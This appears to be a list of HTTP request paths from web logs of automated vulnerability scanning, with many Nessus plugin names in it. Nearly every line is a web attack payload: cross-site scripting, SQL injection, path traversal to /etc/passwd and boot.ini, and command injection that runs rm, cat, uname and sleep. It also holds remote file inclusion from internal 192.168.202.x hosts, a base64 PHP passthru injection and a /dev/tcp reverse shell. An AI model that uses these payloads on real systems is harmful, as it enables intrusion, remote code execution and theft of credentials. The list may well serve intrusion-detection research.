"/<script>document.cookie=""testvowq=604;""</script>"
/help.php?q='\x0adel\x09q47355772\x09#
/examples/jsp/sessions/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>
"/m2fpztty.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/phpmyadmin/sawmillcl.exe?ho+{complete_version}
/sscript/
/cgi-bin/webplus?script=/../../../../etc/passwd
/subscriptions.part
/g8nu2yy7.jspa?<script>cross_site_scripting.nasl</script>
/top.php?stuff=';rm q26271527 #
/scripts/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
"/7dbjwpw6.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/cgibin/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
"/top.php?stuff=""ping -w 7000 -n 1 1.2.3.4&rem "
/cgi-bin/index.php?p='nessus
"/main.php?stuff=""sleep 11 #"
"/en-us/odzk29aa.nsf?<script>document.cookie=""testtfvh=2141;""</script>"
/scripts/prnnucptkixl.php
"/ju0u7kfo.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/ydexw8by.x?<meta http-equiv=set-cookie content=""testulex=4996"">"
"/main.php?logout=""&uname >q45435148 #"
/cgi-win/ion-p?page=../../../../../etc/passwd
/cgibin/gw5/gwweb.exe?help=bad-request
"/j4rdyhw8.fts?<script>document.cookie=""testrluj=1420;""</script>"
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/djjeroppey.sh'); function v
/scripts/ylrvly9nh_pf.inc
/scripts/index.php?op=default&date=200607' union select 1
/scripts/vhost.php?action=logout&time=1331908735
/scripts/kfzqb5x87lvq.pl
"/newsletter_log.php?logfile=info.php&logtime=000060&email=<?php echo md5(""test""); ?>"
"/ao22ww7y.do?<script>document.cookie=""testqppc=8767;""</script>"
/javascript/globals.exe
/b5xdqgz2.exe?<script>cross_site_scripting.nasl</script>
"/jw64yq8u.x?<meta http-equiv=set-cookie content=""testylfu=1313"">"
/scripts/gitweb.pl
/main.php?logout='&del q16695623 #
/scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1
"/uvazfs7p.pl?<meta http-equiv=set-cookie content=""testwtbo=4831"">"
/cgi-bin/insertorder.cfm?cfid=1&cftoken=1 union select 1
/examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0
/top.php?stuff='\x0auname\x09>q23871271\x09#
/manager/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl'
/javascript/subscription.exe
"/ju0u7kfo.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/manager/admin/addentry.php?phpbb_root_path=/etc/passwd\x00
/recordings/index.php?chemin=../../../../../../..//etc
/en-us/account/home/search.asp?nchannel='1
/javascript/_vti_cnf.exe
/0qhcnefz.aspx?<script>cross_site_scripting.nasl</script>
/ssxmagazinesubscription/
"/en-us/<img src=""javascript:alert(cross_site_scripting.nasl);"">.dll"
/examples/servlets/servlet/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904435
/examples/jsp/checkbox/newsscript.pl?mode=admin
"/en-us/ddoworrl.asp?<script>document.cookie=""testvlau=8517;""</script>"
/javascript/resolution.exe
/examples/jsp/jsp2/jspx/include/sql.php?include_path=/etc/passwd\x00
/scripts/vzdybnanqpc3.inc
/\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini
/fcgi-bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
/cgis/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
/javascript/programs.exe
/help.php?q=&uname\x09>q82939622\x09#
"/t3af3tdz.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scripts/index.php?board=nonexistant1419816536
"/b5xdqgz2.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/bn857frh.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/s7qus4g3.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scgi-bin/.htpasswd
/phpmyadmin/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00
/en-us/account/a1stats/a1disp3.cgi?/../../../../../../etc/passwd
/recordings/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||
"/dslpwt15.do?<script>document.cookie=""testtkio=5454;""</script>"
/mom's ass/
/javascript/1994.exe
/scripts/qg9h0c0svvat.sh
"/606wkcop.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/en-us/s7qus4g3.cfm?<script>cross_site_scripting.nasl</script>
"/vhzmaia2.cfm?<meta http-equiv=set-cookie content=""testkogj=3979"">"
/javascript/htpasswd.pl
"/main.php?stuff=""&ping"
"/i2n4v4rl.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/postnuke/html/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script>
/scripts/search.scr.php?globals[pth][classes]=http://cirt.net/rfiinc.txt??
/en-us/account/index.php?act=arcade&do=stats&gameid=1'
/g8nu2yy7.kspx?<script>cross_site_scripting.nasl</script>
/javascript/document.sfish
"/help.php?q=""ping\xa0-w\xa08000\xa0-n\xa01\xa04.3.2.1&rem\xa0"
/7dbjwpw6.nsf?<script>cross_site_scripting.nasl</script>
/ny1b3qq4.x?<script>cross_site_scripting.nasl</script>
/faq.php?action=&type=view&s=&id=-1' union select 0
"/scs86g1p.cfc?<meta http-equiv=set-cookie content=""testquyx=2820"">"
/cgi-home/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
/oncixdescription/
"/en-us/oie504mr.x?<script>document.cookie=""testtpby=7052;""</script>"
/main.php?logout=&ping;-w;7000;-n;1;4.3.2.1&rem;
"/search.jsp?q=%""<script>alert(1331905049)</script>"
/scripts/man-cgi?section=0&topic=ls;id
/xsskj3/
/main.php?stuff='\x0auname\x09>q47233887\x09#
/examples/jsp/jsp2/el/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd
"/1r8cfrlf.kspx?<meta http-equiv=set-cookie content=""testydan=5106"">"
/scripts/mensajeitor.php
/passwdage/
/en-us/splunk_413_404error_xss.nasl-1331904921
"/bl8sefdm.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/banners.php?op=emailstats&cid=1 and passwd like 'a%'/*
/script/
/scripts/breakcal/calendar.cgi
/javascript/pipermail.exe
/examples/jsp/checkbox/index.php?id='union/**/select/**/0
"/bmeun223.cfm?<script>document.cookie=""testhhwu=7044;""</script>"
"/t3af3tdz.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/yef5f3d5.jsp?<meta http-equiv=set-cookie content=""testcrcv=6167"">"
/main.php?frm_daynight=day&frm_passwd=&frm_referer=q72116194&frm_user=&scr_height=&scr_width=
/scripts/rot13sj.cgi?/etc/passwd
/examples/jsp/jsp2/jspx/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
"/main.php?stuff="";rm q85142671 #"
/ywaxntrx.jspa?<script>cross_site_scripting.nasl</script>
"/help.php?q=""ver\xa0>q74458178&rem\xa0"
"/<meta http-equiv=set-cookie content=""testggad=2000"">"
"/eg2u8pbv.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scripts/k0pxpjgnimox.php
/phpmyadmin/way-board/way-board.cgi?db=/etc/passwd\x00
/cacti/gadgets/blog/blogmodel.php?path=/etc/passwd\x00
/en-us/n9xlumt5.html?<script>cross_site_scripting.nasl</script>
/manager/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454
"/phpmyadminsearch_results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/"
/edit.jsp?page=user&editor=../../../install
/bin/pfdispaly.cgi?../../../../../../../../../../etc/passwd
/examples/jsp/sessions/supporter/tupdate.php?groupid=change&sg='
/bemarket/postscript/postscript.php?p_mode=http://192.168.202.118:8080/moclyxlwqyfjnp?
/scriptpath/footers.php?tinybb_footers=http://192.168.202.118:8080/zz5thkvtmlgl?
/manager/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl
/grey's anatomy 3x09 repack hdtv/
"/en-us/i686v90l.do?<meta http-equiv=set-cookie content=""testfutf=1550"">"
/phpmyadmin/scripts/setup.php
"/<script>document.cookie=""testylfu=1313;""</script>"
/7dbjwpw6.idc?<script>cross_site_scripting.nasl</script>
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/swgnhpydbq0t?"
"/esmozg5d.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/javascript/property.exe
/prescription-xanax/
"/if69ddo1.php?<script>document.cookie=""testiabz=5220;""</script>"
/scripts/troops.cgi
/javascript/win32.exe
/javascript/compliance.exe
/scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0
/phpmyadmin/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>
/examples/jsp/sessions/index.php?template=../../../loudblog/custom/config.php\x00
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908691&lang_crm=../../vtigerservice.php\x00
"/main.php?stuff=""&del\x0cq27346825&rem\x0c"
"/9o6g5vkn.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/'stoked' gets to the heart of extreme athletics/
"/0u75ldxq.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/jsp2/jspx/config.php?path[docroot]=/etc/passwd\x00
"/fmnveedu.idc?<meta http-equiv=set-cookie content=""testgfbr=7014"">"
"/help.php?q=""&ping\x0c-w\x0c9000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c"
/javascript/pii.exe
/javascript/ubb.exe
"/j4drbkil.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/jsp2/jspx/index.php?show=/etc/passwd
"/1qwv2p5p.x?<script>document.cookie=""testvqcy=252;""</script>"
/scriptpath/footers.php?tinybb_footers=http://192.168.202.96:8080/ipb5ri?
"/main.php?stuff=""&rm q23549573 #"
/script pack/
"/rpxyx07v.dll?<script>document.cookie=""testbnli=1975;""</script>"
/pohentermine-prescription/
"/eventum/forgot_password.php?email=\""><script>alert(document.cookie)</script>"
"/ddoworrl.do?<script>document.cookie=""testvlau=8517;""</script>"
/megabook/admin.cgi?login=<script>alert('vulnerable')</script>
/initscripts/
/gazette-subscription/
/htbin/sensepost.exe?/c+dir
"/bmeun223.idc?<meta http-equiv=set-cookie content=""testhhwu=7044"">"
/examples/jsp/jsp2/jspx/showcat.php?cat=1'
"/b5xdqgz2.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/cal/index.php?entry='
/javascript/contents.exe
/pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://192.168.202.118:8080/moclyxlwqyfjnp?
/javascript/decl.exe
/recordings/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331918989')</script>
/ttxssh2_210/
/projects/1/repository/annotate?rev=`0<&208-;exec 208<>/dev/tcp/192.168.202.118/26475;sh <&208 >&208 2>&208`
"/en-us/7o5qp766.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/main.php?logout=ver\x0c>q59849218&rem\x0c
/scripts/secure.php?cfgprogdir=/etc/passwd\x00
/index.php?module=topics&func=view&topicid=-1 union select null
/cgi.cgi/fileseek.cgi?foot=;cat /etc/passwd&head=
/path_script/createurl.php?formurl=http://192.168.202.96:8080/swgnhpydbq0t?
/index.php?op=default&date=200607' union select 1
/xnoscript/
/cacti/apa_phpinclude.inc.php?apa_module_basedir=/etc/passwd\x00
/examples/servlets/servlet/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd
/javascript/tuscany.exe
/main.php?stuff=ver
"/zv8tv7h8.asp?<meta http-equiv=set-cookie content=""testcqwz=9752"">"
"/main.php?stuff=""ping"
"/help.php?q=""\x0duname >q75726259 #"
"/v3axg1p8.idc?<meta http-equiv=set-cookie content=""testxagh=6987"">"
"/top.php?stuff=""ping\x0c-w\x0c10000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c"
"/main.php?logout=""del\x0cq37726783&rem\x0c"
/texis.exe/?-dump
/launch.jsp?nfuse_application=<script>alert('vulnerable')</script>
/phpmyadmin/index.php/1'
/examples/jsp/jsp2/el/index.php?configfile=../../../../../../../../../etc/passwd
"/javascript/.htaccess.sfish/''''"""""""""
"/en-us/9kr0ih0v.dll?<script>document.cookie=""testzgnm=1183;""</script>"
/cgi-home/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
/scripts/axdgpyi2bn6f.php3
/fcgi-bin/gwweb.exe?help=bad-request
"/top.php?stuff=""&del\xa0q12371867&rem\xa0"
/examples/jsp/checkbox/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wfppkgt4]));die;/*
"/nyvbv05h.html?<meta http-equiv=set-cookie content=""testftxz=5980"">"
"/cgi-bin/server.pt?open=space&name="";}</script><script>alert('plumtree_name_xss.nasl')</script>"
"/chat/register.php?register=yes&username=overg&email=<script>alert (\""vulnerable\"")</script>&email1=<script>alert (\""vulnerable\"")</script>"
/scripts/image.php?src=system/config/localconfig.php
/archive.php?scriptpath=http://192.168.202.118:8080/2aibfaczmac8??
/..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1../winnt/system32/cmd.exe?/c+dir+c:\+/og
/main.php?frm_daynight=q51426141&frm_passwd=&frm_referer=http%3a//192.168.23.202/main.php%3flogout%3d1&frm_user=&scr_height=&scr_width=
"/bzuf9ozq.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/boilerplate.asp?nfuse_template=../../boot.ini&amp;nfuse_currentfolder=/sslx0020directories|-|0|404_object_not_found
"/<meta http-equiv=set-cookie content=""testgfbr=7014"">"
"/index.php?err=3&email=\""><script>alert(document.cookie)</script>"
/examples/jsp/num/admin/configset.php?settings_dir=/etc/passwd\x00
/cgi-bin/main.cgi?board=free_board&command=down_load&filename=../../../../../../../../../../etc/passwd
"/help.php?q=""sleep\x097\x09#"
"/ywaxntrx.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/jsp2/el/home/search.asp?nchannel='1
/moore's_law/
/cgi-perl/texis.exe/junk
/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331909370
/claroline/resourcelinker/resourcelinker.inc.php?clarolinerepositorysys=/etc/passwd\x00
/zqqemp6j.htm?<script>cross_site_scripting.nasl</script>
/examples/jsp/num/remindpasswd
/examples/jsp/colors/wiki/edit.php?page=sandbox&suck_url=../kernel/config_inc.php&do_suck=h
"/main.php?stuff=""\x0adel\x09q48139983\x09#"
/cgi-bin/fileseek2.cgi?head=;cat /etc/passwd|&foot=
/examples/jsp/jsp2/jspx/index.php?string='
/javascript/info.exe
/javascript/.passwd.pfx
/scripts/index.php?include_files[]=&include_files[query_string]=/etc/passwd
/tukodz3j.cgi?<script>cross_site_scripting.nasl</script>
"/awstats/awstats.pl?migrate=|echo;/bin/echo -en ""vj\0001j\0002\0211\0341j\0001jfx\0133\0315\0200\0222"" >> /tmp/ldlchhikup0;echo|awstats247374.txt"
/ows-bin/r.cgi?file=../../../../../../../../../../etc/passwd
"<script>document.cookie=""testtbjy=7334;""</script>"
"/jnt3f86c.kspx?<script>document.cookie=""testcmax=9270;""</script>"
"/search.aspx?keywords=<script>alert(""413385588094"")</script>"
/en-us/jnv890lt.nsf?<script>cross_site_scripting.nasl</script>
/main.php?stuff=;sleep 9 #
/help.php?q='|sleep 8 #
/examples/jsp/colors/cgiip.exe/wservice=wsbroker1/webutil/ping.p
/cacti/htmlscript?../../../../../../../../../etc/passwd
"/help.php?q=""&sleep\x099\x09#"
